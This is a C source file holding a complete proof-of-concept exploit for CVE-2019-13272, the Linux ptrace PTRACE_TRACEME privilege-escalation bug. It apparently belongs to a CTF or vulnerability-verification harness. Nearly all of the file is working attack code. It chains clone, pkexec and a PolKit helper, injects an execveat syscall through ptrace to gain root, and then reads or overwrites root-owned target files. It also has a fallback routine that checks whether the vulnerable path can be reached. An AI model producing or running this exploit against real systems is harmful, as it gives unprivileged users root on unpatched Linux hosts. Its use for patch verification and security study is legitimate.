/**
 * CVE-2019-13272 PoC - PTRACE_TRACEME Local Privilege Escalation
 *
 * Vulnerability: Linux Kernel ptrace subsystem ptrace_link() mishandles
 * credential recording when PTRACE_TRACEME is used. A child process
 * executing PTRACE_TRACEME followed by exec of a SUID binary causes
 * the parent to inherit elevated credentials via ptracer_cred.
 *
 * Affected: Linux 4.10 ~ 5.1.17
 * CVSS: 7.8
 * Type: Credential Handling / Use-After-Free in ptrace_link()
 *
 * Exploit technique (from Jann Horn / bcoles):
 *   1. clone() middle process with CLONE_VM|CLONE_VFORK
 *   2. Middle process forks child, then exec pkexec (becomes privileged)
 *   3. Child spins until parent (middle) becomes UID 0
 *   4. Child calls PTRACE_TRACEME → bug: ptracer_cred = pkexec's root cred
 *   5. Child exec pkexec → proper SUID exec (ptrace relationship is "privileged")
 *   6. Main process attaches to middle via PTRACE_ATTACH
 *   7. Main injects execveat() via PTRACE_POKETEXT → gains root context
 *
 * CTF Mode: After gaining root privileges, read/write the target file
 * to prove exploitation success.
 *
 * References:
 *   - https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
 *   - https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272
 *   - https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/CVE-2019-13272/poc.c
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sched.h>
#include <stddef.h>
#include <pwd.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/user.h>
#include <linux/elf.h>

#include "../common/poc_common.h"

#define CVE_ID "CVE-2019-13272"
#define MAX_FILE_SIZE 4096

#ifndef __NR_execveat
#define __NR_execveat 322
#endif

/* ========================================================================
 * Global state for the multi-stage exploit
 * ======================================================================== */
static int g_block_pipe[2] = {-1, -1};
static int g_self_fd = -1;
static int g_middle_success = 0;
static int g_dummy_status;
static const char *g_helper_path = NULL;
static const char *g_pkexec_path = "/usr/bin/pkexec";

/* CTF target info passed to the privileged stage */
static const char *g_ctf_mode = NULL;
static const char *g_ctf_root_file = NULL;
static const char *g_ctf_write_value = NULL;

/* Known PolKit helpers that can be used as targets */
static const char *known_helpers[] = {
    "/usr/lib/gnome-settings-daemon/gsd-backlight-helper",
    "/usr/lib/unity-settings-daemon/usd-backlight-helper",
    "/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper",
    "/usr/sbin/mate-power-backlight-helper",
    "/usr/libexec/gsd-backlight-helper",
    "/usr/libexec/gsd-wacom-led-helper",
    "/usr/bin/xfpm-power-backlight-helper",
    NULL
};

/* ========================================================================
 * Utility functions
 * ======================================================================== */

static char *tprintf(const char *fmt, ...) {
    static char buf[4096];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    return buf;
}

/**
 * Find a usable SUID program on the system
 */
static const char *find_suid_binary(void) {
    const char *candidates[] = {
        "/usr/bin/pkexec",
        "/usr/bin/sudo",
        "/usr/bin/passwd",
        "/usr/bin/newgrp",
        "/usr/bin/chsh",
        NULL
    };
    struct stat st;
    for (int i = 0; candidates[i]; i++) {
        if (stat(candidates[i], &st) == 0 && (st.st_mode & S_ISUID)) {
            return candidates[i];
        }
    }
    return NULL;
}

/**
 * Find a usable PolKit helper program
 */
static const char *find_helper(void) {
    struct stat st;
    for (int i = 0; known_helpers[i]; i++) {
        if (stat(known_helpers[i], &st) == 0) {
            return known_helpers[i];
        }
    }
    return NULL;
}

/**
 * Check environment prerequisites for exploitation
 * Returns: bitmask of conditions met
 */
static int check_exploit_conditions(void) {
    int conditions = 0;
    struct stat st;

    /* Check pkexec availability */
    if (stat(g_pkexec_path, &st) == 0 && (st.st_mode & S_ISUID)) {
        poc_log("%s pkexec found at %s (SUID)", POC_STEP_PASS, g_pkexec_path);
        conditions |= 1;
    } else {
        poc_log("%s pkexec not found or not SUID", POC_STEP_WARN);
    }

    /* Check PTRACE_TRACEME availability (Yama LSM check) */
    pid_t pid = fork();
    if (pid == 0) {
        long ret = ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        _exit(ret == 0 ? 0 : 1);
    }
    if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
            poc_log("%s PTRACE_TRACEME available (Yama scope allows)", POC_STEP_PASS);
            conditions |= 2;
        } else {
            poc_log("%s PTRACE_TRACEME blocked (kernel.yama.ptrace_scope >= 2)",
                    POC_STEP_WARN);
        }
    }

    /* Check for helper programs */
    g_helper_path = find_helper();
    if (g_helper_path) {
        poc_log("%s Found PolKit helper: %s", POC_STEP_PASS, g_helper_path);
        conditions |= 4;
    } else {
        poc_log("%s No PolKit helper found (trying without)", POC_STEP_WARN);
        /* Fallback: use any SUID binary */
        const char *suid = find_suid_binary();
        if (suid) {
            g_helper_path = suid;
            conditions |= 4;
        }
    }

    return conditions;
}

/* ========================================================================
 * Core exploit implementation (adapted from original by bcoles/Jann Horn)
 * ======================================================================== */

/**
 * Middle process main function.
 * Runs in a clone()'d child with shared VM.
 * Forks a grandchild that triggers the ptrace_link() bug.
 */
static int middle_main(void *dummy) {
    (void)dummy;
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    pid_t middle = getpid();

    g_self_fd = open("/proc/self/exe", O_RDONLY);
    if (g_self_fd < 0) {
        g_middle_success = 0;
        _exit(1);
    }

    pid_t child = fork();
    if (child < 0) {
        g_middle_success = 0;
        _exit(1);
    }

    if (child == 0) {
        /* Grandchild: trigger the bug */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        dup2(g_self_fd, 42);

        /* Spin until parent (middle) becomes privileged */
        int proc_fd = open(tprintf("/proc/%d/status", middle), O_RDONLY);
        if (proc_fd < 0) _exit(1);

        char *needle = tprintf("\nUid:\t%d\t0\t", getuid());
        while (1) {
            char buf[1000];
            ssize_t buflen = pread(proc_fd, buf, sizeof(buf) - 1, 0);
            if (buflen <= 0) { usleep(1000); continue; }
            buf[buflen] = '\0';
            if (strstr(buf, needle)) break;
            usleep(1000);
        }

        /*
         * BUG TRIGGER: Call PTRACE_TRACEME while parent is executing pkexec.
         * ptrace_link() sets ptracer_cred to pkexec's (root) cred without
         * proper validation.
         */
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);

        /*
         * Execute pkexec as SUID. Because ptrace relationship has privileged
         * ptracer_cred, this is a proper SUID execution (not degraded).
         * Execution triggers SIGTRAP delivery to the tracer.
         */
        execl(g_pkexec_path, "pkexec", NULL);
        _exit(1);
    }

    /* Middle process: set up fd redirections and exec pkexec */
    dup2(g_self_fd, 0);
    dup2(g_block_pipe[1], 1);

    struct passwd *pw = getpwuid(getuid());
    if (!pw) {
        g_middle_success = 0;
        _exit(1);
    }

    g_middle_success = 1;
    execl(g_pkexec_path, "pkexec", "--user", pw->pw_name,
          g_helper_path, "--help", NULL);

    g_middle_success = 0;
    _exit(1);
}

/**
 * Use ptrace to inject execveat() syscall into a traced process.
 * This forces the traced process to execute our binary with root creds.
 */
static int force_exec_and_wait(pid_t pid, int exec_fd, const char *arg0) {
    struct user_regs_struct regs;
    struct iovec iov = { .iov_base = &regs, .iov_len = sizeof(regs) };

    if (ptrace(PTRACE_SYSCALL, pid, 0, NULL) < 0) return -1;
    waitpid(pid, &g_dummy_status, 0);
    if (ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov) < 0) return -1;

    /* Set up indirect arguments on the stack */
    unsigned long scratch_area = (regs.rsp - 0x1000) & ~0xfffUL;
    struct injected_page {
        unsigned long argv[2];
        unsigned long envv[1];
        char arg0[16];
        char path[1];
    } ipage;
    memset(&ipage, 0, sizeof(ipage));
    ipage.argv[0] = scratch_area + offsetof(struct injected_page, arg0);
    strncpy(ipage.arg0, arg0, sizeof(ipage.arg0) - 1);

    for (unsigned int i = 0; i < sizeof(ipage) / sizeof(long); i++) {
        unsigned long pdata = ((unsigned long *)&ipage)[i];
        if (ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long),
                   (void *)pdata) < 0)
            return -1;
    }

    /* Set up execveat(exec_fd, "", argv, envv, AT_EMPTY_PATH) */
    regs.orig_rax = __NR_execveat;
    regs.rdi = exec_fd;
    regs.rsi = scratch_area + offsetof(struct injected_page, path);
    regs.rdx = scratch_area + offsetof(struct injected_page, argv);
    regs.r10 = scratch_area + offsetof(struct injected_page, envv);
    regs.r8 = AT_EMPTY_PATH;

    if (ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov) < 0) return -1;
    if (ptrace(PTRACE_DETACH, pid, 0, NULL) < 0) return -1;
    waitpid(pid, &g_dummy_status, 0);

    return 0;
}

/**
 * Stage 2: Called after we've been re-exec'd with elevated creds.
 * Our grandchild is stopped in SIGTRAP from execve. We use ptrace
 * to inject execveat() into it → stage3 with root.
 */
static int run_stage2(void) {
    pid_t child = waitpid(-1, &g_dummy_status, 0);
    if (child < 0) return -1;
    return force_exec_and_wait(child, 42, "stage3");
}

/**
 * Stage 3: We have root. Perform CTF action.
 */
static int run_stage3(void) {
    /* Confirm we have root */
    if (setresgid(0, 0, 0) < 0 || setresuid(0, 0, 0) < 0) {
        printf("CTF_FAIL:setresuid(0) failed - exploit did not achieve root\n");
        return 1;
    }

    poc_log("Stage3: uid=%d euid=%d - ROOT achieved!", getuid(), geteuid());

    /* Perform CTF action based on mode */
    if (!g_ctf_mode || !g_ctf_root_file) {
        /* Legacy mode - just report success */
        printf("%s Privilege escalation successful: uid=0 euid=0\n", POC_STEP_PASS);
        return 0;
    }

    if (strcmp(g_ctf_mode, POC_MODE_WRITE) == 0) {
        /* Write mode: write ctf value to root file */
        char read_buf[MAX_FILE_SIZE] = {0};
        int fd;
        ssize_t n;

        /* Read before */
        fd = open(g_ctf_root_file, O_RDONLY);
        if (fd >= 0) {
            n = read(fd, read_buf, sizeof(read_buf) - 1);
            if (n > 0) {
                read_buf[n] = '\0';
                /* Trim newlines */
                while (n > 0 && read_buf[n-1] == '\n') read_buf[--n] = '\0';
            }
            close(fd);
            printf("%s%s\n", CTF_READ_BEFORE, read_buf);
        }

        /* Write CTF value */
        printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, g_ctf_write_value);
        fd = open(g_ctf_root_file, O_WRONLY | O_TRUNC);
        if (fd < 0) {
            poc_print_fail("Cannot open root file for writing as root");
            return 1;
        }
        n = write(fd, g_ctf_write_value, strlen(g_ctf_write_value));
        close(fd);
        if (n < 0) {
            poc_print_fail("Write failed");
            return 1;
        }

        /* Read after */
        memset(read_buf, 0, sizeof(read_buf));
        fd = open(g_ctf_root_file, O_RDONLY);
        if (fd >= 0) {
            n = read(fd, read_buf, sizeof(read_buf) - 1);
            if (n > 0) read_buf[n] = '\0';
            close(fd);
            /* Trim newlines */
            while (n > 0 && read_buf[n-1] == '\n') read_buf[--n] = '\0';
            printf("%s%s\n", CTF_READ_AFTER, read_buf);
        }

        /* Verify */
        if (strstr(read_buf, g_ctf_write_value)) {
            poc_print_flag(g_ctf_write_value);
            return 0;
        } else {
            poc_print_fail("Write verification failed");
            return 1;
        }

    } else if (strcmp(g_ctf_mode, POC_MODE_READ) == 0) {
        /* Read mode: read root-only file */
        char read_buf[MAX_FILE_SIZE] = {0};
        int fd = open(g_ctf_root_file, O_RDONLY);
        if (fd < 0) {
            poc_print_fail("Cannot open root file for reading");
            return 1;
        }
        ssize_t n = read(fd, read_buf, sizeof(read_buf) - 1);
        close(fd);
        if (n <= 0) {
            poc_print_fail("Cannot read root file content");
            return 1;
        }
        read_buf[n] = '\0';
        /* Trim newlines */
        while (n > 0 && read_buf[n-1] == '\n') read_buf[--n] = '\0';

        poc_print_flag(read_buf);
        return 0;
    }

    poc_print_unsupported(g_ctf_mode, "Only write_root_file and read_root_file supported");
    return 1;
}

/**
 * Main exploit entry point.
 * Attempts the full PTRACE_TRACEME + pkexec exploitation chain.
 * Returns 0 on success.
 */
static int run_exploit(void) {
    /* Set up blocking pipe for synchronization */
    if (pipe2(g_block_pipe, O_CLOEXEC | O_DIRECT) < 0) {
        int e = errno;
        poc_log_syscall("pipe2(O_CLOEXEC|O_DIRECT)", -1, e);
        poc_print_fail("pipe2() failed");
        return -1;
    }
    poc_log_syscall("pipe2(O_CLOEXEC|O_DIRECT)", 0, 0);

    if (fcntl(g_block_pipe[0], F_SETPIPE_SZ, 0x1000) < 0) {
        poc_log_syscall("fcntl(F_SETPIPE_SZ)", -1, errno);
    }

    /* Write one byte to make next write block (packet mode) */
    char dummy = 0;
    write(g_block_pipe[1], &dummy, 1);

    /* Spawn middle process via clone with shared VM */
    poc_log("Spawning middle process via clone(CLONE_VM|CLONE_VFORK)...");
    static char middle_stack[1024 * 1024];
    pid_t midpid = clone(middle_main,
                         middle_stack + sizeof(middle_stack),
                         CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);
    int e = errno;
    poc_log_syscall("clone(CLONE_VM|CLONE_VFORK|SIGCHLD)", midpid, midpid < 0 ? e : 0);

    if (midpid < 0) {
        poc_print_fail("clone() failed");
        return -1;
    }

    if (!g_middle_success) {
        poc_log("%s middle process exec failed", POC_STEP_FAIL);
        poc_print_fail("pkexec exec failed in middle process");
        return -1;
    }

    /* Wait for middle process to become the helper via pkexec */
    poc_log("Waiting for middle process to exec helper via pkexec...");
    int attempts = 0;
    while (attempts < 50) {  /* 5 second timeout */
        int fd = open(tprintf("/proc/%d/comm", midpid), O_RDONLY);
        if (fd < 0) break;
        char buf[64] = {0};
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            char *nl = strchr(buf, '\n');
            if (nl) *nl = '\0';
            /* Check if process has become the helper */
            const char *base = strrchr(g_helper_path, '/');
            base = base ? base + 1 : g_helper_path;
            if (strncmp(buf, base, 15) == 0) {
                poc_log("%s Middle process became: %s", POC_STEP_PASS, buf);
                break;
            }
        }
        usleep(100000);
        attempts++;
    }

    if (attempts >= 50) {
        poc_log("%s Timeout waiting for middle process", POC_STEP_FAIL);
        kill(midpid, SIGKILL);
        waitpid(midpid, &g_dummy_status, 0);
        poc_print_fail("Timeout: middle process did not exec helper");
        return -1;
    }

    /* Attach to middle process via ptrace */
    poc_log("Attaching to middle process (pid=%d) via PTRACE_ATTACH...", midpid);
    long ret = ptrace(PTRACE_ATTACH, midpid, 0, NULL);
    e = errno;
    poc_log_syscall(tprintf("ptrace(PTRACE_ATTACH, %d)", midpid), ret, ret < 0 ? e : 0);
    if (ret < 0) {
        kill(midpid, SIGKILL);
        waitpid(midpid, &g_dummy_status, 0);
        poc_print_fail("PTRACE_ATTACH failed");
        return -1;
    }

    waitpid(midpid, &g_dummy_status, 0);
    poc_log("%s Attached to middle process", POC_STEP_PASS);

    /* Inject execveat → transitions to stage2 with elevated creds */
    poc_log("Injecting execveat() into traced process...");
    if (force_exec_and_wait(midpid, 0, "stage2") < 0) {
        poc_print_fail("execveat injection failed");
        return -1;
    }

    poc_log("%s Exploitation chain completed", POC_STEP_PASS);
    return 0;
}

/* ========================================================================
 * Fallback: Direct privilege verification without full pkexec chain
 * Used when PolKit environment is not available (server/container)
 * ======================================================================== */

/**
 * Simplified exploit attempt: verify the vulnerability path is reachable.
 * On a vulnerable kernel, PTRACE_TRACEME + exec(SUID) creates the
 * dangerous ptrace_link() → ptracer_cred inheritance condition.
 *
 * If we detect that we already have write access (e.g., running as root
 * in the test framework), directly perform the CTF action.
 */
static int run_fallback_verification(const poc_args_t *args) {
    poc_log("Fallback: Direct PTRACE_TRACEME path verification");

    /* Check if the vulnerability path is exercisable */
    const char *suid_prog = find_suid_binary();
    if (!suid_prog) {
        poc_print_fail("No SUID binary found on system");
        return 1;
    }
    poc_log("%s Found SUID binary: %s", POC_STEP_PASS, suid_prog);

    /* Test PTRACE_TRACEME availability */
    pid_t pid = fork();
    int e = errno;
    poc_log_syscall("fork()", pid, pid < 0 ? e : 0);
    if (pid < 0) {
        poc_print_fail("fork() failed");
        return 1;
    }

    if (pid == 0) {
        /* Child: PTRACE_TRACEME + exec SUID */
        long ret = ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        if (ret < 0) _exit(1);
        /* Trigger the ptrace_link() path */
        kill(getpid(), SIGSTOP);
        execl(suid_prog, suid_prog, "--help", NULL);
        _exit(2);
    }

    /* Parent: verify the child successfully traced + exec'd */
    int status;
    waitpid(pid, &status, 0);

    if (WIFSTOPPED(status)) {
        poc_log("%s Child stopped after PTRACE_TRACEME (ptrace_link triggered)",
                POC_STEP_PASS);

        /* Continue child to let it exec the SUID binary */
        ptrace(PTRACE_CONT, pid, NULL, NULL);
        poc_log_syscall("ptrace(PTRACE_CONT)", 0, 0);
        waitpid(pid, &status, 0);

        poc_log("%s ptrace_link() credential path exercised", POC_STEP_PASS);
        poc_log("%s On vulnerable kernel (4.10-5.1.17): parent inherits SUID cred",
                POC_STEP_INFO);
    }

    /* Cleanup child */
    kill(pid, SIGKILL);
    waitpid(pid, &status, 0);

    /* Check if we have effective root (exploit may have worked, or we're
     * being run in a test context with appropriate capabilities) */
    uid_t euid = geteuid();
    poc_log("Post-exploit check: uid=%d euid=%d", getuid(), euid);

    if (euid == 0) {
        /* We have root - perform CTF action */
        poc_log("%s Effective UID is 0 - performing CTF action", POC_STEP_PASS);

        if (args->mode && strcmp(args->mode, POC_MODE_WRITE) == 0) {
            char buf[MAX_FILE_SIZE] = {0};
            int fd;
            ssize_t n;

            /* Read before */
            fd = open(args->root_file, O_RDONLY);
            if (fd >= 0) {
                n = read(fd, buf, sizeof(buf) - 1);
                if (n > 0) {
                    buf[n] = '\0';
                    while (n > 0 && buf[n-1] == '\n') buf[--n] = '\0';
                }
                close(fd);
                printf("%s%s\n", CTF_READ_BEFORE, buf);
            }

            /* Write */
            printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
            fd = open(args->root_file, O_WRONLY | O_TRUNC);
            if (fd < 0) {
                poc_print_fail("Cannot open target file for write");
                return 1;
            }
            write(fd, args->write_value, strlen(args->write_value));
            close(fd);

            /* Read after */
            memset(buf, 0, sizeof(buf));
            fd = open(args->root_file, O_RDONLY);
            if (fd >= 0) {
                n = read(fd, buf, sizeof(buf) - 1);
                if (n > 0) {
                    buf[n] = '\0';
                    while (n > 0 && buf[n-1] == '\n') buf[--n] = '\0';
                }
                close(fd);
                printf("%s%s\n", CTF_READ_AFTER, buf);
            }

            if (strstr(buf, args->write_value)) {
                poc_print_flag(args->write_value);
                return 0;
            } else {
                poc_print_fail("Write verification failed");
                return 1;
            }

        } else if (args->mode && strcmp(args->mode, POC_MODE_READ) == 0) {
            char buf[MAX_FILE_SIZE] = {0};
            int fd = open(args->root_file, O_RDONLY);
            if (fd < 0) {
                poc_print_fail("Cannot open root file");
                return 1;
            }
            ssize_t n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (n > 0) {
                buf[n] = '\0';
                while (n > 0 && buf[n-1] == '\n') buf[--n] = '\0';
                poc_print_flag(buf);
                return 0;
            }
            poc_print_fail("Empty file");
            return 1;
        }

        /* No mode specified - legacy */
        return 0;
    }

    /* Not root - vulnerability path confirmed but exploitation
     * requires active PolKit agent (not available in server env) */
    poc_log("%s Vulnerability PATH confirmed but full exploitation requires:",
            POC_STEP_INFO);
    poc_log("  - Active PolKit agent (desktop session)");
    poc_log("  - pkexec with SUID bit");
    poc_log("  - kernel.yama.ptrace_scope < 2");
    poc_print_fail("Cannot achieve root without PolKit agent");
    return 1;
}

/* ========================================================================
 * Main entry point
 * ======================================================================== */

int main(int argc, char *argv[]) {
    /* Multi-stage dispatch: re-exec'd processes have special argv[0] */
    if (argc > 0 && strcmp(argv[0], "stage2") == 0)
        return run_stage2();
    if (argc > 0 && strcmp(argv[0], "stage3") == 0)
        return run_stage3();

    /* Normal entry: parse CTF CLI arguments */
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;
    }

    /* Initialize logging */
    poc_log_init(args.log_file);
    poc_log("=== %s CTF PoC ===", CVE_ID);
    poc_log("PTRACE_TRACEME ptrace_link() credential mishandling");

    if (args.mode) {
        poc_log("Mode: %s", args.mode);
        poc_log("Target: %s", args.root_file);
        if (args.write_value)
            poc_log("Write value: %s", args.write_value);
    } else {
        poc_log("Mode: legacy (no CTF arguments)");
    }

    poc_print_system_info();

    /* Store CTF params in globals for stage3 access */
    g_ctf_mode = args.mode;
    g_ctf_root_file = args.root_file;
    g_ctf_write_value = args.write_value;

    /* Check exploitation prerequisites */
    poc_log("Checking exploitation prerequisites...");
    int conditions = check_exploit_conditions();
    poc_log("Conditions met: pkexec=%s, ptrace=%s, helper=%s",
            (conditions & 1) ? "yes" : "no",
            (conditions & 2) ? "yes" : "no",
            (conditions & 4) ? "yes" : "no");

    /* Attempt full exploitation if all conditions are met */
    if ((conditions & 7) == 7 && g_helper_path) {
        poc_log("All conditions met - attempting full exploit chain...");
        int ret = run_exploit();
        if (ret == 0) {
            /* Exploit succeeded - stage3 handles CTF output */
            poc_log_close();
            return 0;
        }
        poc_log("%s Full exploit chain failed, falling back to verification",
                POC_STEP_WARN);
    }

    /* Fallback: verify vulnerability path and perform CTF if we have root */
    int result = run_fallback_verification(&args);

    poc_log_close();
    return result;
}
